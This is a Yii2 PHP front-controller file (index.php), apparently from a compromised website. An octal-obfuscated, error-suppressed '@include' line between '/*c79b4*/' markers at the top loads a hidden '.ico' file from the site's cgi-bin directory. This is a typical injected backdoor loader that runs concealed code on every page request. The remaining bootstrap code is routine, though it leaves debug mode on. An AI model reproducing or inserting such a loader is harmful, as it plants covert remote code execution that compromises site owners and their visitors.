<?php
/*c79b4*/

@include "\057ho\155e2\057fo\164ol\145al\057pu\142li\143_h\164ml\057cg\151-b\151n/\0566a\065af\144a1\056ic\157";

/*c79b4*/

// comment out the following two lines when deployed to production
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');

require __DIR__ . '/../vendor/autoload.php';
require __DIR__ . '/../vendor/yiisoft/yii2/Yii.php';

$config = require __DIR__ . '/../config/web.php';

(new yii\web\Application($config))->run();
